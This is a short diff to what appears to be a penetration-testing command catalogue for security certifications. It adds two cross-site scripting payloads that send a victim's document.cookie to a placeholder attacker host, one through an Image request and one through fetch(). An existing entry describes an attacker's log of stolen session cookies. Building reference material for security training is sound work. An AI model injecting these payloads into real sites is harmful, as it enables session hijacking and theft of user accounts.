         "artifacts": "Attacker's cookies.txt: 'Victim IP: x.x.x.x | Cookie: PHPSESSID=...' entries. Server access log: GET /index.php?c= and GET /script.js requests from victim IPs."
-      }
+      },
+      "variations": [
+        {
+          "label": "Cookie-stealing payload",
+          "command": "<script>new Image().src='http://<ip>/log.php?c='+document.cookie</script>"
+        },
+        {
+          "label": "Exfil via fetch()",
+          "command": "<script>fetch('http://<ip>/?c='+document.cookie)</script>"
+        }
+      ]
     },
     {
       "id": "xss-session-remote-script",
@@ -90715,7 +90943,7 @@ const COMMAND_DATA = {
     }
   ],
   "totalCommands": 908,
-  "buildDate": "2026-09-08T10:32:21.623Z",
+  "buildDate": "2026-09-08T14:55:11.381Z",
   "certifications": [
     "CDSA",
     "CPTS",
